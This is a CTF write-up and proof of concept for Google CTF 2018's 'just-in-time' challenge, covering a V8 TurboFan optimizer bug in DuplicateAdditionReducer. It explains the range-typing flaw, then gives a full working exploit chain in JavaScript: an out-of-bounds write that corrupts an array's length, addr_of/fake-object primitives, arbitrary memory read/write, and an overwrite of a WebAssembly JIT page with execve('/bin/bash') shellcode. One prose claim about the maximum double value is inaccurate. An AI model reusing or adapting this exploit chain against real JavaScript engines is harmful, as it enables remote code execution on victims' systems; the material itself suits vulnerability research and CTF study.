Google CTF 2018

This is just a POC is just-in-time CTF from Google's CTF 2018.

The bug in the CTF is introduced with the addition of DuplicateAdditionReducer during the Type lowering stage in TurboFan compiler pipeline.
The DuplicateAdditionReducer adds the following:

==========================================================================================================
Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) {
  DCHECK_EQ(node->op()->ControlInputCount(), 0);
  DCHECK_EQ(node->op()->EffectInputCount(), 0);
  DCHECK_EQ(node->op()->ValueInputCount(), 2);

  Node* left = NodeProperties::GetValueInput(node, 0);
  if (left->opcode() != node->opcode()) {
    return NoChange();
  }
  Node* right = NodeProperties::GetValueInput(node, 1);
  if (right->opcode() != IrOpcode::kNumberConstant) {
    return NoChange();
  }

  Node* parent_left = NodeProperties::GetValueInput(left, 0);
  Node* parent_right = NodeProperties::GetValueInput(left, 1);
  if (parent_right->opcode() != IrOpcode::kNumberConstant) {
    return NoChange();
  }

  double const1 = OpParameter<double>(right->op());
  double const2 = OpParameter<double>(parent_right->op());
  Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
  
  NodeProperties::ReplaceValueInput(node, parent_left, 0);
  NodeProperties::ReplaceValueInput(node, new_const, 1);

  return Changed(node);
}

==========================================================================================================

The idea here is to handle cases like : x + 1 + 1 and reduce to x + 2. 

THE BUG:

First observation, ReduceAddition converts the value to doubles: 
  .......
  double const1 = OpParameter<double>(right->op());
  double const2 = OpParameter<double>(parent_right->op());
  Node* new_const = graph()->NewNode(common()->NumberConstant(const1+const2));
  .......

The maximum value for a double is 9007199254740992.
Second observation is the difference between the following cases:

d8> 9007199254740992 + 1
9007199254740992
d8> 9007199254740992 + 1 + 1

While:

d8> 9007199254740992 + 2
9007199254740994

Now, the early stage in the pipeline(Typer stage) needs to calculate the range for the value and will get that the value is 9007199254740992 + 1 + 1 = 9007199254740992.
Then, during the "Typer lowering" stage, the reducer will get called, apply the optimization and will get 9007199254740992 + 2 = 9007199254740994.
The issue is that it never updates the range accordingly, this means that in the later stages the range is still considered as 9007199254740992.

One of the cases where this becomes a serious issue is during bound checking. Since if the early stage calculated a range of 9007199254740992 which is never updated, later
stages which check if bounds checking should be removed will use that range as well. Since those stages come after "Typed lowering", the wrong range is used since the range was modified 
during the reducer.

Example:

function g(trigger)
{

  double_arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
  oob = [6.1, 6.2, 6.3, 6.4, 6.5, 6.6, 6.7, 6.8];

  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;
  x = x + 1 + 1;
  x -= 9007199254740991;
  x *= 9;                                         // this will get me to the offset of the length of oob

  double_arr[x] =  1.39064994160909e-309;         // 0xffff00000000

}

if trigger == 0 then no issue:

x = 9007199254740989 + 1 + 1 = 9007199254740991
x -= 9007199254740991 = 0
x *= 9 = 0 --> within the bounds of the array.

if trigger == 1:

x = 9007199254740992

Typer stage : 
x = 9007199254740992 + 1 + 1 = 9007199254740992
x -= 9007199254740991 -> 9007199254740992 - 9007199254740991 = 1
x *= 9 --> x = 9 --> x within the bounds of the array.

Typed lowering stage:

x = 9007199254740992 + 1 + 1 = 9007199254740994
x -= 9007199254740991 = 3
x *= 9 --> x become out of bounds of the array
        --> This is never updated and so the compiler does not know it in the later stages.

Bounds checking removal(escape analysis->simplified lowering):

The compiler still thinks that the range is 9007199254740992 and so it will remove the bound checks since x falls within the bounds of the array.
This assumption is incorrect and result in OOB access outside of that array.


Exploitation

Environment info:

Ubuntu 20.04.6
V8 version 7.2.288
NOTE: I used a 2018 commit of several month prior the the CTF's date but I think it should work(with some minor changes maybe) on older versions.

Stable primitive

Since the idea is to create a stable primitive, instead of generating OOB with compilation and risking issue such as deopt, the goal is to first create
an array after the first array and overwrite that array's length field which will provide the second oob array to be used as a stable out of bounds primitive:

function g(trigger)
{

  double_arr = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
  oob = [6.1, 6.2, 6.3, 6.4, 6.5, 6.6, 6.7, 6.8];

  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;
  x = x + 1 + 1;
  x -= 9007199254740991;
  x *= 9;                                         // this will get me to the offset of the length of oob

  double_arr[x] =  1.39064994160909e-309;         // 0xffff00000000

}

Addr_of

Using the oob array its possible to allocate another array of JS Values and use the oob array to read the pointers of the JS values as doubles
thereby leaking any addresses.

function addr_of(addr)
{
  jsval_arr[1] = addr;
  let address_res = Int64.from_double(oob[js_val_index]).sub(1);
  return address_res;
}


Obj_at_addr

In order to create a fake object, a fake reference needs to be created. Obj_at_addr will allow to create an arbitrary reference which will be used to point to the fake object.

function obj_at_addr(addr)
{

  let d = Int64.to_Int64(addr).add(1); // pointer tagging
  let u = d.to_double();               // to store in oob as double

  oob[js_val_index] = u;

  let new_ref = jsval_arr[1];
  return new_ref;

}

Fake object

Few objects can be used as fake objects such as ArrayBuffer. In this case the use is of double array.

let fake_obj_holder = [1.1, 1.2, 1.3, 1.4];

fake_obj_holder[0] = double_arr_map.to_double();                 // map
fake_obj_holder[1] = double_arr_prop.to_double();                // properties
fake_obj_holder[2] = double_arr_prop.to_double();;               // elements --> corruption target
fake_obj_holder[3] = new Int64(0x0000004000000000).to_double();  // length

let fake_obj_addr = addr_of(fake_obj_holder).sub(0x20);
print("[+] fake object address: " + fake_obj_addr);

let fake = obj_at_addr(fake_obj_addr);

Arbitrary read/write

function read64(target_address)
{

  let x1 = target_address.sub(0x10).add(1);  // pointer tagging
  let x2 = x1.to_double();                         // to store in oob as double

  fake_obj_holder[2] = x2;

  return Int64.from_double(fake[0]);

}

function write64(target_address, val)
{

  let x1 = target_address.sub(0x11).add(1);
  let x2 = x1.to_double();

  fake_obj_holder[2] = x2;

  fake[0] = Int64.to_double(val);

  //%SystemBreak();

}

Execution hijacking

Using Wasm to abuse the rw of the code section. When creating a Wasm instance:

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});

It will contain a pointer to the jump table which will eventually lead to the main function. Using the arbitrary read/write this can be overwritten with a shellcode

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,
128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,
142,128,128,128,0,1,136,128,128,128,0,0,65,239,253,182,245,125,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var target_func = wasmInstance.exports.main;

let JIT_ptr = read64(addr_of(wasmInstance).add(0xe8));

console.log("[+] JIT pointer address : " + JIT_ptr);

JIT_ptr = JIT_ptr.add(0x1);

//#execve("/bin/bash",{NULL},{NULL})
write64(JIT_ptr, new Int64('0x9090909090909090'));
write64(JIT_ptr.add(8), new Int64('0x732f6e69622fb848'));
write64(JIT_ptr.add(0x10), new Int64('0x50c0315f54500068'));
write64(JIT_ptr.add(0x18), new Int64('0x050f5e545a543bb0'));






        











  
 

























